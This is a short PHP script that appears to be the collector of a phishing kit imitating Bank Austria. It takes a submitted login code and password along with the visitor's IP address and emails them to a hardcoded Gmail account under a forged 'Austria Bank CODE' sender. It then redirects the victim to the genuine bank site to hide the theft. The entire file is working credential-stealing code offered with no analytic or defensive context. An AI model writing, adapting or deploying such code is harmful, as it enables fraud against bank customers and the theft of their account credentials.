<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "Code: ".$_POST['LoginPortletFormID']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By Unknown----------------\n";
$post = "danielmorgan058@gmail.com";
$subj = "$ip - ".$_POST['pass']."\n";
$from = "From: Austria Bank CODE<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: https://www.bankaustria.at/");	  

?>